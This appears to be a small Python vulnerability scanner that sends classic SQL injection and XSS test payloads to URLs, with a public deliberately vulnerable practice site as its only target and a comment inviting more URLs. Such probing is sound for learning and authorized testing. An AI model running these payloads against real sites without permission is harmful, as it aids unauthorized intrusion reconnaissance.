# vuln_scanner.py
import requests

urls = [
    "http://testphp.vulnweb.com/artists.php?artist=1",  # known vulnerable test site
    # add more URLs here
]

payloads = ["'", "' OR '1'='1", "<script>alert('XSS')</script>"]

print("[*] Scanning for SQLi/XSS...")

for url in urls:
    for payload in payloads:
        full_url = url + payload
        try:
            res = requests.get(full_url, timeout=3)
            if "mysql" in res.text.lower() or "syntax" in res.text.lower():
                print(f"[SQLi] Vulnerable URL: {full_url}")
            elif payload in res.text:
                print(f"[XSS] Vulnerable URL: {full_url}")
        except:
            pass
